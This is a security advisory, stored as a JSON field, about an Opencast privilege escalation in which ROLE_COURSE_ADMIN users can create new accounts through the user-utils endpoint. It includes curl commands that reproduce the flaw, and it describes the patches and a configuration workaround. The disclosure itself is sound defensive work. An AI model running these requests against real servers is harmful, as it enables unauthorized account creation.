  "details": "### Impact\n\nUsers with the role `ROLE_COURSE_ADMIN` can use the user-utils endpoint to create new users not including the role `ROLE_ADMIN`. For example:\n\n```bash\n# Use the admin to create a new user with ROLE_COURSE_ADMIN using the admin user.\n# We expect this to work.\n% curl -i -u admin:opencast 'https://example.opencast.org/user-utils/xy.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP/2 201\n\n# Use the new user to create more new users.\n# We don't exp\u00fcect a user with just role ROLE_COURSE_ADMIN to succeed.\n# But it does work\n% curl -i -u xy:f 'https://example.opencast.org/user-utils/ab.json' -X PUT \\\n  --data 'password=f&roles=%5B%22ROLE_COURSE_ADMIN%22%5D'\nHTTP/2 201\n```\n`ROLE_COURSE_ADMIN` is a non-standard role in Opencast which is referenced neither in the documentation nor in any code (except for tests) but only in the security configuration. From the name \u2013 implying an admin for a specific course \u2013 users would never expect that this role allows user creation.\n\n### Patches\n\nThis issue is fixed in 7.6 and 8.1 which both ship a new default security configuration.\n\n### Workarounds\n\nYou can fix this issue by removing all instances of `ROLE_COURSE_ADMIN` in your organization's security configuration (`etc/security/mh_default_org.xml` by default).\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [opencast/opencast](https://github.com/opencast/opencast/issues)\n- For security-relevant information, email us at security@opencast.org",
